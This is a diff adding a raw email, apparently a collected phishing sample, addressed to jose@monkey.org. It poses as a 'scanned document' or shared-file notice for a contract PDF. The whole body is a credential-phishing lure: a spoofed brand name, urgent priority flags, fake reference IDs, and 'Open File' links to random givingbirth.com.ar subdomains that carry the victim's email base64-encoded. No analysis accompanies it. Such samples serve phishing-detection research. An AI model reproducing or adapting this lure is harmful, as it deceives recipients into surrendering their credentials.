@@ -1,0 +1,170 @@
+Return-Path: uk@ticketingorder.com
+Delivered-To: jose@monkey.org
+X-FDA: 81786584124.25.F340DAB
+Received: from mail.ticketingorder.com (mail.ticketingorder.com
+ [172.82.187.10])	by imf03.b.hostedemail.com (Postfix) with ESMTP id
+ AD5D8120002	for <jose@monkey.org>; Tue, 13 Feb 2024 11:39:00 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;	dkim=pass
+ header.d=ticketingorder.com header.s=dkim header.b=RuBN4htZ;	spf=pass
+ (imf03.b.hostedemail.com: domain of uk@ticketingorder.com designates
+ 172.82.187.10 as permitted sender) smtp.mailfrom=uk@ticketingorder.com;
+	dmarc=pass (policy=none) header.from=ticketingorder.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1707824340;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=DU9yzPs29ZSeYOKFO+hFgOYrpre5rQxFXQH0ttelaFc=;
+	b=worQEPJOiFtscV5vrfxspCOb97itC75Ed8Z3uKHUkx8Gsd8j530+MA96NxbFIwmSRLwMRs
+	L6urZToMD9vgbWdftj0MTUpwm/8pjN+YxfgVuNthA+/4X7LWUdgcn8YAv/0Xn58hx3F6pv
+	dPt0x+QB1CklBH1JZPmcdqGd7gKU10A=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1707824340; a=rsa-sha256;
+	cv=none;
+	b=N1J5OjusERBOmaPpTvq4dEMGJeYC+W0ZsnYvZAWeLyqMychm+nx7aMQFMiZ+x2IT4avKZ7
+	W98SWWdKySU4fG8ZqMzuNbjGJgynvVXwH7NuI/fRZ6BL8M+Gi+eTVOj8XhfBWf3otwxQ8X
+	1cVuwrhyEa80AgeJXea+mnqqW1zzx8g=
+ARC-Authentication-Results: i=1;	imf03.b.hostedemail.com;	dkim=pass
+ header.d=ticketingorder.com header.s=dkim header.b=RuBN4htZ;	spf=pass
+ (imf03.b.hostedemail.com: domain of uk@ticketingorder.com designates
+ 172.82.187.10 as permitted sender) smtp.mailfrom=uk@ticketingorder.com;
+	dmarc=pass (policy=none) header.from=ticketingorder.com
+Received: from mail.ticketingorder.com (localhost [127.0.0.1])
+	by mail.ticketingorder.com (Postfix) with ESMTP id 4TYzSM4VZ3z221p
+	for <jose@monkey.org>; Tue, 13 Feb 2024 06:22:11 -0500 (EST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=
+	ticketingorder.com; h=message-id:date:date:mime-version
+	:content-type:content-type:to:subject:subject:from:from; s=dkim;
+	 t=1707823331; x=1710415332; bh=b5ZosBLzG6E6nPPwxKGn9kvm6cf6JeN5
+	MQH/StbpdLU=; b=RuBN4htZyKMmAqcNHvp6GHcos1qL6Z8OsY11Qy6dcieBMG9x
+	fRPwVszQTFP3qoYT0Was2VWQyfqXJmaBQpvTbo9K0d6tog98GPN+qxBejYRrJzY1
+	FdFGv+WmxdEsAZKARDIEe21seCGsMoTnFKfZ3g1JLyihr7h4YzwLBj44IjI=
+X-Virus-Scanned: amavisd-new at mail.ticketingorder.com
+X-Spam-Flag: NO
+X-Spam-Score: 3.662
+X-Spam-Level: ***
+Received: from mail.ticketingorder.com ([127.0.0.1])	by
+ mail.ticketingorder.com (mail.ticketingorder.com [127.0.0.1]) (amavisd-new,
+ port 10026)	with ESMTP id vTb5Gi2TmlZD for <jose@monkey.org>;	Tue, 13 Feb
+ 2024 06:22:11 -0500 (EST)
+Received: from WIN-BUNS25TD77J (unknown [163.5.112.23])
+	by mail.ticketingorder.com (Postfix) with ESMTPSA id 4TYzSL4rnsz25qv
+	for <jose@monkey.org>; Tue, 13 Feb 2024 06:22:10 -0500 (EST)
+From: "Monkey Docu.Scanned" <uk@ticketingorder.com>
+Subject: Scanned Docu: Contract Agreement  For Monkey   id:Grg2eWNY_ jose
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="CFiY4gSM=_t8iOOFpr22DqetfA5o23no7r"
+MIME-Version: 1.0
+Date: Tue, 13 Feb 2024 12:22:10 +0100
+Priority: urgent
+X-Priority: 2
+Importance: high
+Message-Id: <202413021222104CDB3CCF8E$3D9B95D509@ticketingorder.com>
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: AD5D8120002
+X-Stat-Signature: ndxrw5s7wi55ysee7kr6g3941obkjda7
+X-Spam-Status: No, score=0.37
+X-Rspam-User: 
+X-HE-Tag: 1707824340-474211
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+13T6284mmXdi84WmEPXw2xbBB6nqVcV6YTfsDzi9HB47?=
+ =?utf-8?q?44MOpc/OyS2KNQIkzXzpJDmnNJdkr5YzDSto2XU9lBFIaCA66TahevjFPbXvWyExL?=
+ =?utf-8?q?IHsQkkgW/ueGFJN6wucrhcITXVxhK4koE/diplC3Bj5JngJefobKNKMi+XoWhqW5K?=
+ =?utf-8?q?bGf79VO8ZlPK9fMXC3tHDl/dcJbM2k8EJKUnPtJVnlDxaaO8rqvjeUKJBcjxQ6cOc?=
+ =?utf-8?q?GnePyeHxoX0r/NPY41YpY6Qm/GVx2y7y3dtLNGdOsg7J4vmMZ8iq6wgZIkDYQO02+?=
+ =?utf-8?q?MVVEBxkEgTCu4dKAsbCLNv38RBr7l+Bdy7HK+?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 54
+
+This is a multi-part message in MIME format
+
+--CFiY4gSM=_t8iOOFpr22DqetfA5o23no7r
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Monkey Shared a file with you
+
+Date received: Tuesday, February 13, 2024=20
+
+Reference lD: w8vbRzTo
+
+FiIe name: Contract Agreement_89619.pdf
+
+This message was sent to: jose@monkey.org.
+
+Open File https://rRnDwlBM.givingbirth.com.ar/?email=3Dam9zZUBtb25rZXk=
+ub3Jn
+
+--CFiY4gSM=_t8iOOFpr22DqetfA5o23no7r
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html urn:schemas-microsoft-com:vml?? ?3D? urn:schemas-microsoft-com:o=
+ffice:word?? omml?? 12 2004 office schemas.microsoft.com http: xmlns=3D=
+'3D"http://www.w3.org/TR/REC-html40"' =3D'=3D""' xmlns:m =3D "3D" xmln=
+s:w =3D "3D" xmlns:v =3D "3D"><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <title>Scanned Docu: Contract Agreement  For Monkey   id:Grg2eWNY_ j=
+ose</title>
+ </head>
+ <body lang=3D3DEN-SG vLink=3D#3d9572 link=3D#3db00e =3D'=3D""'> <P><t=
+able style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto,RobotoDraft,Helveti=
+ca,Arial,sans-serif; COLOR: rgb(38,40,42)" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" align=3Dcenter border=3D0> <tr><td style=3D"FONT-S=
+IZE: 12px; FONT-FAMILY: 'Segoe UI',Arial,sans-serif; FONT-WEIGHT: bold=
+; COLOR: rgb(61,61,61); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDI=
+NG-LEFT: 0px; PADDING-RIGHT: 0px" vAlign=3Dmiddle width=3D640 align=3D=
+right><TBO></TBO><table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto,=
+RobotoDraft,Helvetica,Arial,sans-serif; COLOR: rgb(38,40,42)" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter border=3D0> <tr>=
+<td style=3D"FONT-SIZE: 12px; FONT-FAMILY: 'Segoe UI',Arial,sans-serif=
+; FONT-WEIGHT: bold; COLOR: rgb(0,0,0); PADDING-BOTTOM: 20px; PADDING-=
+TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" vAlign=3Dmiddle widt=
+h=3D20>&nbsp;</td><td style=3D"FONT-SIZE: 12px; FONT-FAMILY: 'Segoe UI=
+',Arial,sans-serif; FONT-WEIGHT: bold; COLOR: rgb(0,0,0); PADDING-BOTT=
+OM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" vA=
+lign=3Dmiddle width=3D600> <H1 style=3D"FONT-SIZE: 38px; MARGIN-BOTTOM=
+: 12px; FONT-FAMILY: 'Segoe UI Light','Segoe UI',Arial,sans-serif; FON=
+T-WEIGHT: 100; COLOR: rgb(0,91,158); PADDING-BOTTOM: 0px; PADDING-TOP:=
+ 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 38px; PADDING-RIGHT: 0px">Monkey=
+ Shared a file with you</H1></td><td style=3D"FONT-SIZE: 12px; FONT-FA=
+MILY: 'Segoe UI',Arial,sans-serif; FONT-WEIGHT: bold; COLOR: rgb(0,0,0=
+); PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING=
+-RIGHT: 0px" vAlign=3Dmiddle width=3D20>&nbsp;</TD></TR></TABLE><table=
+ style=3D"FONT-FAMILY: 'Times New Roman'" width=3D209> </TABLE> <P><ta=
+ble style=3D"FONT-SIZE: 13px; HEIGHT: 193px; FONT-FAMILY: Roboto,Robot=
+oDraft,Helvetica,Arial,sans-serif; WIDTH: 635px; COLOR: rgb(38,40,42)"=
+ cellSpacing=3D0 cellPadding=3D0 width=3D635 align=3Dcenter border=3D0=
+> <tr><td style=3D"FONT-SIZE: 12px; FONT-FAMILY: 'Segoe UI',Arial,sans=
+-serif; COLOR: rgb(0,0,0); PADDING-BOTTOM: 30px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 0px; PADDING-RIGHT: 0px" vAlign=3Dmiddle width=3D20>&nbsp;<=
+/td><td style=3D"FONT-FAMILY: 'Segoe UI',Arial,sans-serif; PADDING-BOT=
+TOM: 30px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 16px; PAD=
+DING-RIGHT: 0px" vAlign=3Dtop width=3D600 align=3Dleft><STRONG>Date re=
+ceived:</STRONG> Tuesday, February 13, 2024 <P><STRONG>Reference lD:</=
+STRONG>&nbsp; gJGtSYUG</p><p><STRONG>FiIe name:</STRONG> Contract Agre=
+ement_34627.pdf</p><p><STRONG>This message was sent to: jose@monkey.or=
+g.</STRONG></P><BR> <TD style=3D"BORDER-TOP: rgb(85,88,175) 1px solid;=
+ BORDER-RIGHT: rgb(85,88,175) 1px solid; WHITE-SPACE: normal !importan=
+t; BORDER-BOTTOM: rgb(85,88,175) 2px solid; PADDING-BOTTOM: 6px; PADDI=
+NG-TOP: 10px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(85,88,175) 2px solid=
+; PADDING-RIGHT: 0px" bgColor=3D#5558af width=3D280 align=3Dcenter><A =
+style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; TEXT-DECORATION: non=
+e; FONT-FAMILY: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; BORDE=
+R-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px=
+; COLOR: rgb(255,255,255) !important; PADDING-BOTTOM: 0px; PADDING-TOP=
+: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-=
+WIDTH: 0px; border-image: none; font-stretch: inherit" href=3D"https:/=
+/x0YmpK8J.givingbirth.com.ar/?email=3Dam9zZUBtb25rZXkub3Jn" rel=3D"noo=
+pener noreferrer" target=3D_blank data-auth=3D"NotApplicable" data-saf=
+elink=3D"true" data-linkindex=3D"0">Open&nbsp; File </A></TD></TR></TA=
+BLE></P></TD></TR></TABLE></P></body>
+ </html>
+
+--CFiY4gSM=_t8iOOFpr22DqetfA5o23no7r--
+
+
